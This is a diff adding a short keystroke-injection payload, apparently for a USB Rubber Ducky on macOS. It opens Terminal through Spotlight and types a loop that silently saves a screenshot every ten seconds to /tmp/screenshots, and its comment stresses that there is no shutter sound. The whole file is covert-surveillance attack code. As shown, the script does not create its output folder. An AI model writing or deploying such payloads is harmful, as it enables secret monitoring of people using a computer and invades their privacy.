@@ -1,0 +1,11 @@
+REM Captures screenshots every 10 seconds without snapshot sounds
+DELAY 2000
+GUI space
+DELAY 500
+STRING terminal
+ENTER
+DELAY 1000
+STRING while true; do ts=$(date +"%Y%m%d-%H%M%S"); o="/tmp/screenshots"; screencapture -x "$o/ss-$ts.png"; sleep 10; done
+ENTER
+ENTER
+GUI q
